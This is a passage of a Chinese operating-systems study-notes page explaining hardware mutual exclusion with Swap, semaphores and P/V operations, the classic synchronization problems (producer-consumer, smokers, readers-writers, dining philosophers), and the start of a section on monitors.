class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Swap指令的作业是交换两个变量的值</span></span><br><span class="line">Swap(<span class="type">bool</span> *a, <span class="type">bool</span> *b){</span><br><span class="line">    <span class="type">bool</span> temp;</span><br><span class="line">    temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 以下是用Swap指令实现互斥的逻辑算法</span></span><br><span class="line"><span class="comment">// lock表示当前临界区是否被加锁</span></span><br><span class="line"><span class="type">bool</span> old = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">while</span>(old == <span class="literal">true</span>)</span><br><span class="line">    Swap(&amp;lock, &amp;old);</span><br><span class="line"><span class="comment">//临界区代码段...</span></span><br><span class="line">lock = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//剩余区代码段...</span></span><br></pre></td></tr></table></figure><p>逻辑上来看Swap和TSL并无太大区别，都是先记录下此时临界区是否已经被上锁(记录在old变量上)，再将上锁标记lock设置为true，最后检查old，如果old为false则说明之前没有别的进程对临界区上锁，则可跳出循环，进入临界区。</p><p>优点：实现简单，无需像软件实现方法那样严格检查是否会有逻辑漏洞；适用于多处理机环境。</p><p>缺点：不满足“让权等待”原则，暂时无法进入临界区的进程会占用CPU并循环执行TSL指令，从而导致“忙等”。</p><h2 id="2-10-信号量机制"><a href="#2-10-信号量机制" class="headerlink" title="2.10 信号量机制"></a>2.10 信号量机制</h2><p>用户进程可以通过使用操作系统提供的一对原语来对信号量进行操作，从而很方便地实现了进程互斥、进程同步。</p><p>信号量其实就是一个变量(可以是一个整数，也可以是更复杂的记录型变量)，可以用一个信号量来表示系统中某种资源的数量，比如：系统中只有一台打印机，就可以设置一个初值为1的信号量。</p><p>原语是一种特殊的程序段，其执行只能一气呵成，不可被中断。原语是由关中断/开中断指令实现的。软件解决方案的主要问题是由“进入区的各种操作无法一气呵成”，因此如果能把进入区、退出区的操作都用“原语”实现，使这些操作能“一气呵成”就能避免问题。</p><p>一对原语：wait(S)原语和signal(S)原语，可以把原语理解为我们自己写的函数，函数名分别为wait和signal，括号里的信号量S其实就是函数调用时传入的一个参数。</p><p>wait、signal原语常简称为P、V操作，因此通常把wait(S)、signal(S)两个操作分别写为P(S)、V(S)。</p><h3 id="2-10-1-整型信号量"><a href="#2-10-1-整型信号量" class="headerlink" title="2.10.1 整型信号量"></a>2.10.1 整型信号量</h3><p>用一个整数型的变量作为信号量，用来表示系统中某种资源的数量。</p><p>与普通整型变量的区别：对信号量的操作只有三种，即初始化、P操作、V操作。</p><p>比如某计算机系统中有一台打印机：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> S = <span class="number">1</span>;<span class="comment">//初始化整型信号量S，表示当前系统中可用的打印机资源数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wiat</span><span class="params">(<span class="type">int</span> S)</span><span class="comment">//wait原语，相当于“进入区”</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(S &lt;= <span class="number">0</span>);<span class="comment">//如果资源数不够，就一直循环等待</span></span><br><span class="line">    S = S - <span class="number">1</span>;<span class="comment">//如果资源数够，则占用一个资源</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> S)</span><span class="comment">//signal原语，相当于“退出区”</span></span><br><span class="line">{</span><br><span class="line">    S = S + <span class="number">1</span>;<span class="comment">//使用完资源后，在退出区释放资源</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程P0：</span><br><span class="line">...</span><br><span class="line">wait(S);<span class="comment">//进入区，申请资源</span></span><br><span class="line">使用打印机资源...<span class="comment">//临界区，访问资源</span></span><br><span class="line">signal(S);<span class="comment">//退出区，释放资源</span></span><br></pre></td></tr></table></figure><p>“检查”和“上锁”一气呵成，避免了并发、异步导致的问题。</p><p>存在的问题：不满足“让权等待”原则，会发生“忙等”。</p><h3 id="2-10-2-记录型信号量"><a href="#2-10-2-记录型信号量" class="headerlink" title="2.10.2 记录型信号量"></a>2.10.2 记录型信号量</h3><p>整型信号量的缺陷是存在“忙等”问题，因此人们又提出了“记录型信号量”，即用记录型数据结构表示的信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*记录型信号量的定义*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> value;<span class="comment">//剩余资源数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">L</span>;</span><span class="comment">//等待队列</span></span><br><span class="line">}semaphore;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*某进程需要使用资源时，通过wait原语申请*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wait</span><span class="params">(semaphore S)</span></span><br><span class="line">{</span><br><span class="line">    S.value--;</span><br><span class="line">    <span class="keyword">if</span>(S.value &lt; <span class="number">0</span>)</span><br><span class="line">        block(S.L);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">如果剩余资源数不够，使用block原语使进程从运行态进入阻塞态，并把挂到信号量S的等待队列(即阻塞队列)中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*进程使用完资源后，通过signal原语释放*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal</span><span class="params">(semaphore S)</span></span><br><span class="line">{</span><br><span class="line">    S.value++;</span><br><span class="line">    <span class="keyword">if</span>(S.value &lt;= <span class="number">0</span>)</span><br><span class="line">        wakeup(S.L);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">释放资源后，若还有别的进程在等待这种资源，则使用wakeup原语唤醒等待队列中的一个进程，该进程从阻塞态变为就绪态</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>对信号量S的一次P操作意味着进程请求一个单位的该类资源，因此需要执行<code>S.value--;</code>，表示资源数减1，当<code>S.value&lt;0</code>时表示该类资源已分配完毕，因此进程应调用block原语进行自我阻塞(当前运行的进程从运行态 -&gt; 阻塞态)，主动放弃处理机，并插入该类资源的等待队列S.L中。可见，该机制遵循了“让权等待”原则，不会出现“忙等”现象。</p><p>对信号量S的一次V操作意味着进程释放一个单位的该类资源，因此需要执行<code>S.value++;</code>，表示资源数加1，若加1后仍是<code>S.value&lt;=0</code>，表示依然有进程在等待该类资源，因此应调用wakeup原语唤醒等待队列中的第一个进程(被唤醒进程从阻塞态 -&gt; 就绪态)。</p><h3 id="2-10-3-用信号量实现进程互斥、同步、前驱关系"><a href="#2-10-3-用信号量实现进程互斥、同步、前驱关系" class="headerlink" title="2.10.3 用信号量实现进程互斥、同步、前驱关系"></a>2.10.3 用信号量实现进程互斥、同步、前驱关系</h3><h4 id="2-10-3-1-实现进程互斥"><a href="#2-10-3-1-实现进程互斥" class="headerlink" title="2.10.3.1 实现进程互斥"></a>2.10.3.1 实现进程互斥</h4><ol><li>分析并发进程的关键活动，划定临界区(如：对临界资源打印机的访问就应放在临界区)</li><li>设置互斥信号量mutex，初值为1</li><li>在临界区之前执行P(mutex)</li><li>在临界区之后执行V(mutex)</li></ol><p>注意：对不同的临界资源需要设置不同的互斥信号量。P、V操作必须成对出现，缺少P(mutex)就不能保证临界资源的互斥访问；缺少V(mutex)会导致资源永不被释放，等待进程永不被唤醒。</p><h4 id="2-10-3-2-实现进程同步"><a href="#2-10-3-2-实现进程同步" class="headerlink" title="2.10.3.2 实现进程同步"></a>2.10.3.2 实现进程同步</h4><p>进程同步：要让各并发进程按要求有序地推进。</p><ol><li>分析什么地方需要实现“同步关系”，即必须保证“一前一后”执行的两个操作(或两句代码)</li><li>设置同步信号量S，初始为0</li><li>在“前操作”之后执行V(S)</li><li>在“后操作”之前执行P(S)</li></ol><p>如何保证代码2在代码4之前？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">semaphore S = <span class="number">0</span>;<span class="comment">//初始化同步信号量，初始值为0</span></span><br><span class="line">P1()</span><br><span class="line">{</span><br><span class="line">    代码<span class="number">1</span>;</span><br><span class="line">    代码<span class="number">2</span>;</span><br><span class="line">    V(S);</span><br><span class="line">    代码<span class="number">3</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">P2()</span><br><span class="line">{</span><br><span class="line">    P(S);</span><br><span class="line">    代码<span class="number">4</span>;</span><br><span class="line">    代码<span class="number">5</span>;</span><br><span class="line">    代码<span class="number">6</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>若先执行到V(S)操作，则S++后S=1。之后当执行到P(S)操作时，由于S=1，表示有可用资源，会执行S—，S的值变回0，P2进程不会执行block原语，而是继续往下执行代码4。</p><p>若先执行到P(S)操作，由于S=0，S—后S=-1，表示此时没有可用资源，因此P操作中会执行block原语，主动请求阻塞。之后当执行完代码2，继而执行V(S)操作，S++，使S变回0，由于此时有进程在该信号量对应的阻塞队列中，因此会在V操作中执行wakeup原语，唤醒P2进程。这样P2就可以继续执行代码4了。</p><h4 id="2-10-3-3-实现前驱关系"><a href="#2-10-3-3-实现前驱关系" class="headerlink" title="2.10.3.3 实现前驱关系"></a>2.10.3.3 实现前驱关系</h4><p>进程P1中有句代码S1，P2中有句代码S2，…，P6中有句代码S6。这些代码要求按如下前驱图所示的顺序来执行：</p><img src="/posts/d04bd5bc/2.10.3.3.png" class="" title="前驱图"><img src="/posts/d04bd5bc/2.10.3.3.1.png" class="" title="前驱图"><h3 id="2-10-4-生产者-消费者问题"><a href="#2-10-4-生产者-消费者问题" class="headerlink" title="2.10.4 生产者-消费者问题"></a>2.10.4 生产者-消费者问题</h3><p>系统中有一组生产者进程和一组消费者进程，生产者进程每次生产一个产品放入缓冲区，消费者进程每次从缓冲区中去除一个产品并使用。(注：这里的“产品”理解为某种数据)</p><p>生产者、消费者共享一个初始为空、大小为n的缓冲区。只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待。只有缓冲区不空时，消费者才能从中取出产品，否则必须等待。缓冲区是临界资源，各进程必须互斥地访问。</p><p>如何用信号量机制(P、V操作)实现生产者、消费者进程的这些功能呢？信号量机制可实现互斥、同步、对一类系统资源的申请和释放。</p><p>互斥：设置初值为1的互斥信号量</p><p>同步：设置初值为0的同步信号量(实现“一前一后”)</p><p>对一类系统资源的申请和释放：设置一个信号量，初始值即为资源的数量(本质上也属于“同步问题”，若无空闲资源，则申请资源的进程需要等待别的进程释放资源后才能继续往下执行)</p><p>PV操作题目分析步骤：</p><ol><li><p>关系分析。找出题目中描述的各个进程，分析它们之间的同步、互斥关系。</p></li><li><p>整理思路。根据各进程的操作流程确定P、V操作的大致顺序。</p><p>生产者每次要消耗(P)一个空闲缓冲区，并生产(V)一个产品；消费者每次要消耗(P)一个产品，并释放一个空闲缓冲区(V)。往缓冲区放入/取走产品需要互斥。</p></li><li><p>设置信号量。设置需要的信号量，并根据题目条件确定信号量初值。(互斥信号量初值一般为1，同步信号量的初始值要看对应资源的初始值是多少)</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">semaphore mutex = <span class="number">1</span>;<span class="comment">//互斥信号量，实现对缓冲区的互斥访问</span></span><br><span class="line">semaphore empty = n;<span class="comment">//同步信号量，表示空闲缓冲区的数量</span></span><br><span class="line">semaphore full = <span class="number">0</span>;<span class="comment">//同步信号量，表示产品的数量，也即非空缓冲区的数量</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">producer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        生产一个产品;</span><br><span class="line">        P(empty);<span class="comment">//消耗一个空闲缓冲区</span></span><br><span class="line">        P(mutex);<span class="comment">//实现互斥是在同一进程中进行一对PV操作</span></span><br><span class="line">        把产品放入缓冲区;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(full);<span class="comment">//增加一个产品</span></span><br><span class="line">        <span class="comment">//V(full)和下面的P(full)实现两进程的同步关系，是在其中一个进程中执行P，另一进程中执行V</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">consumer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(full);<span class="comment">//消耗一个产品(非空缓冲区)</span></span><br><span class="line">        P(mutex);</span><br><span class="line">        从缓冲区取出一个产品;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty);<span class="comment">//增加一个空闲缓冲区</span></span><br><span class="line">        使用产品;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>如果将生产者进程和消费者进程里面的两个P互换位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">producer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        生产一个产品;</span><br><span class="line">        P(mutex);①</span><br><span class="line">        P(empty);②</span><br><span class="line">        把产品放入缓冲区;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(full);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">consumer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(mutex);③</span><br><span class="line">        P(full);④</span><br><span class="line">        从缓冲区取出一个产品;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty);</span><br><span class="line">        使用产品;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>若此时缓冲区内已经放满产品，也就是empty = 0，full = n。则生产者进程执行①使mutex变为0，再执行②，由于已没有空闲缓冲区，因此生产者被阻塞。由于生产者阻塞，因此切换回消费者进程。消费者进程执行③，由于mutex为0，即生产者还没释放对临界资源的“锁”，因此消费者也被阻塞。这就造成了生产者等待消费者释放空闲缓冲区，而消费者又等待生产者释放临界区的情况，生产者和消费者循环等待被对方唤醒，出现“死锁”。</p><p>同样的，若缓冲区中没有产品，即full = 0，empty = n。按③④①的顺序执行也会发生死锁。因此，实现互斥的P操作一定要在实现同步的P操作之后。</p><h3 id="2-10-5-多类生产者-多类消费者问题"><a href="#2-10-5-多类生产者-多类消费者问题" class="headerlink" title="2.10.5 多类生产者-多类消费者问题"></a>2.10.5 多类生产者-多类消费者问题</h3><p>桌子上有一只盘子，每次只能向其中放入一个水果。爸爸专向盘子中放苹果，妈妈专向盘子中放橘子，儿子专等着吃盘子中的橘子，女儿专等着吃盘子中的苹果。只有盘子空时，爸爸或妈妈才可向盘子中放一个水果。仅当盘子中有自己需要的水果时，儿子或女儿可以从盘子中取出水果。用PV操作实现上述过程。</p><ol><li><p>关系分析。</p><p>互斥关系：对缓冲区(盘子)的访问要互斥地进行</p><p>同步关系(一前一后)：</p><ul><li>父亲将苹果放入盘子后，女儿才能取苹果</li><li>母亲将橘子放入盘子后，儿子才能取橘子</li><li>只有盘子为空时，父亲或母亲才能放入水果(“盘子为空”这个事件可以由儿子或女儿触发，事件发生后才允许父亲或母亲放水果)</li></ul></li><li><p>整理思路。</p><p>互斥：在临界区前后分别PV</p><p>同步：前V后P</p></li><li><p>设置信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">semaphore mutex = <span class="number">1</span>;<span class="comment">//实现互斥访问盘子</span></span><br><span class="line">semaphore apple = <span class="number">0</span>;<span class="comment">//盘子中有几个苹果</span></span><br><span class="line">semaphore orange = <span class="number">0</span>;<span class="comment">//盘子中有几个橘子</span></span><br><span class="line">semaphore plate = <span class="number">1</span>;<span class="comment">//盘子中还可以放多少个水果</span></span><br></pre></td></tr></table></figure></li></ol><img src="/posts/d04bd5bc/2.10.5.1.png" class="" title="多生产者-多消费者"><img src="/posts/d04bd5bc/2.10.5.2.png" class="" title="多生产者-多消费者"><p>原因在于：本题中的缓冲区大小为1，在任何时刻，apple、orange、plate三个同步信号量中最多只有一个是1。因此在任何时刻，最多只有一个进程的P操作不会被阻塞，并顺利地进入临界区。</p><img src="/posts/d04bd5bc/2.10.5.3.png" class="" title="多生产者-多消费者"><p>但加上总没错，设置互斥信号量就对了。</p><h3 id="2-10-6-吸烟者问题"><a href="#2-10-6-吸烟者问题" class="headerlink" title="2.10.6 吸烟者问题"></a>2.10.6 吸烟者问题</h3><p>假设一个系统有三个吸烟者进程和一个供应者进程。每个抽烟者不停地卷烟并抽掉它，但是要卷起并抽掉一支烟，抽烟需要有三种材料：烟草、纸和胶水。三个抽烟者中，第一个拥有烟草、第二个拥有纸、第三个拥有胶水。供应者进程无限地提供三种材料，供应者每次将两种材料放桌子上，拥有剩下那种材料的抽烟者卷一根烟并抽掉它，并给供应者进程一个信号告诉完成了，供应者就会放另外两种材料在桌上，这个过程一直重复(让三个抽烟者轮流抽烟)。</p><p>本质上这题也属于“生产者-消费者”问题，更详细的说应该是“可生产多种产品的单生产者-多消费者”。</p><ol><li><p>关系分析。</p><p>互斥：桌子可以抽象为容量为1的缓冲区，要互斥访问</p><ul><li>组合一：纸+胶水</li><li>组合二：烟草+胶水</li><li>组合三：烟草+纸</li></ul><p>同步：</p><ul><li>桌上有组合一 -&gt; 第一个抽烟者取走东西</li><li>桌上有组合二 -&gt; 第二个抽烟者取走东西</li><li>桌上有组合三 -&gt; 第三个抽烟者取走东西</li><li>发出完成信号 -&gt; 供应者将下一个组合放到桌上</li></ul></li><li><p>整理思路。</p><p>互斥：在临界区前后分别PV</p><p>同步：前V后P</p></li><li><p>设置信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">semaphore offer1 = <span class="number">0</span>;<span class="comment">//桌上组合一的数量</span></span><br><span class="line">semaphore offer2 = <span class="number">0</span>;<span class="comment">//桌上组合二的数量</span></span><br><span class="line">semaphore offer3 = <span class="number">0</span>;<span class="comment">//桌上组合三的数量</span></span><br><span class="line">semaphore finish = <span class="number">0</span>;<span class="comment">//抽烟是否完成</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//用于实现“三个抽烟者轮流抽烟”</span></span><br></pre></td></tr></table></figure></li></ol><img src="/posts/d04bd5bc/2.10.5.4.png" class="" title="吸烟者问题"><h3 id="2-10-7-读者-写者问题"><a href="#2-10-7-读者-写者问题" class="headerlink" title="2.10.7 读者-写者问题"></a>2.10.7 读者-写者问题</h3><p>有读者和写者两组并发进程，共享一个文件，当两个或两个以上的读进程同时访问共享数据时不会产生副作用，但若某个写进程和其它进程(读进程或写进程)同时访问共享数据时则可能导致数据不一致的错误。因此要求：①允许多个读者可以同时对文件执行读操作；②只允许一个写者往文件中写信息；③任一写者在完成写操作之前不允许其它读者或写者工作；④写者执行写操作前，应让已有的读者和写者全部退出。</p><p>两类进程：写进程、读进程</p><p>互斥关系：写进程-写进程，写进程-读进程。读进程与读进程不存在互斥问题</p><p>写者进程和任何进程都互斥，设置一个互斥信号量rw，在写者访问共享文件前后分别执行P、V操作。读者进程和写者进程也要互斥，因此读者访问共享文件前后也要对rw执行P、V操作。如果所有读者进程在访问共享文件之前都执行P(rw)操作，那么会导致各个读进程之间也无法同时访问文件。Key：读者写者问题的核心思想——怎么处理该问题？</p><p>P(rw)和V(rw)其实就是对共享文件的“加锁”和“解锁”。既然各个读进程需要同时访问，而读进程与写进程又必须互斥访问，那么我们可以让第一个访问文件的读进程“加锁”，让最后一个访问完文件的读进程“解锁”。可以设置一个整数变量count来记录当前有几个读进程在访问文件。</p><img src="/posts/d04bd5bc/2.10.png" class="" title="读者写者问题"><img src="/posts/d04bd5bc/2.10.7.png" class="" title="读者写者问题"><h3 id="2-10-8-哲学家进餐问题"><a href="#2-10-8-哲学家进餐问题" class="headerlink" title="2.10.8 哲学家进餐问题"></a>2.10.8 哲学家进餐问题</h3><p>一张圆桌上坐着5名哲学家，每2个哲学家之间的桌上摆一根筷子，桌子的中间是一碗米饭。哲学家们倾注毕生的精力用于思考和进餐，哲学家在思考时，并不影响他人。只有当哲学家饥饿时，才试图拿起左、右两根筷子(一根一根地拿起)。如果筷子已在他人手上，则需等待。饥饿的哲学家只有同时拿起两根筷子才可以开始进餐，当进餐完毕后，放下筷子继续思考。</p><ol><li>关系分析。系统中有5个哲学家进程，5位哲学家与左右邻居对其中间筷子的访问是互斥关系。</li><li>整理思路。这个问题中只有互斥关系，但与之前遇到的问题不同的是，每个哲学家进程需要同时持有两个临界资源才能开始吃饭。如何避免临界资源分配不当造成的死锁现象，是哲学家问题的精髓。</li><li>信号量设置。定义互斥信号量数组chopstick[5]={1,1,1,1,1}用于实现对5个筷子的互斥访问。并对哲学家按0~4编号，哲学家i左边的筷子编号为i，右边的筷子编号为(i+1)%5。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">semaphore chopstick[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>};</span><br><span class="line">Pi()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(chopstick[i]);<span class="comment">//拿左</span></span><br><span class="line">        P(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//拿右</span></span><br><span class="line">        吃饭...</span><br><span class="line">        V(chopstick[i]);<span class="comment">//放左</span></span><br><span class="line">        V(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//放右</span></span><br><span class="line">        思考...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>以上当5个进程并发执行，每个哲学家同时拿起自己左边的筷子，在拿起右边的筷子的时候会发生阻塞，因为每个右边的筷子都被邻居占据了，每个哲学家都等待邻居放下筷子，造成“死锁”。</p><p>如何防止死锁的发生呢？</p><p>①可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐。这样可以保证至少有一个哲学家是可以拿到左右两支筷子的。</p><p>②要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一支筷子，另一个会直接阻塞。这就避免了占有一支后再等待另一支的情况。</p><p>③各个哲学家拿筷子这件事必须互斥地执行。这就保证了即使一个哲学家在拿筷子拿到一半时被阻塞，也不会有别的哲学家继续尝试拿筷子。这样的话，当前正在吃饭的哲学家放下筷子后，被阻塞的哲学家就可以获得等待的筷子了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">semaphore chopstick[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>};</span><br><span class="line">semaphore mutex = <span class="number">1</span>;<span class="comment">//互斥地取筷子</span></span><br><span class="line">Pi()<span class="comment">//i号哲学家的进程</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(mutex);</span><br><span class="line">        P(chopstick[i]);<span class="comment">//拿左</span></span><br><span class="line">        P(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//拿右</span></span><br><span class="line">        V(mutex);</span><br><span class="line">        吃饭...</span><br><span class="line">        V(chopstick[i]);<span class="comment">//放左</span></span><br><span class="line">        V(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//放右</span></span><br><span class="line">        思考...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-11-管程"><a href="#2-11-管程" class="headerlink" title="2.11 管程"></a>2.11 管程</h2><p>信号量机制存在的问题：编写程序困难、易出错，由此引入“管程”成分——一种高级同步机制。</p><p>管程是一种特殊的软件模块，由这些部分组成：</p><ul><li>局部于管程的共享数据结构说明</li><li>对该数据结构进行操作的一组过程</li><li>对局部于管程的共享数据设置初始值的语句</li><li>管程有一个名字</li></ul><p>管程的基本特征：</p><ul><li>局部于管程的数据只能被局部于管程的过程所访问</li><li>一个进程只有通过调用管程内的过程才能进入管程访问共享数据</li><li>每次仅允许一个进程在管程内执行某个内部过程</li></ul><h3 id="2-11-1-用管程解决生产者消费者问题"><a href="#2-11-1-用管程解决生产者消费者问题" class="headerlink" title="2.11.1 用管程解决生产者消费者问题"></a>2.11.1 用管程解决生产者消费者问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">monitor ProducerConsumer</span><br><span class="line">    condition full, empty;<span class="comment">//条件变量用来实现同步(排队)</span></span><br><span class="line"><span class="comment">//管程中设置条件变量和等待/唤醒操作，以解决同步问题</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;<span class="comment">//缓冲区中的产品数</span></span><br><span class="line">  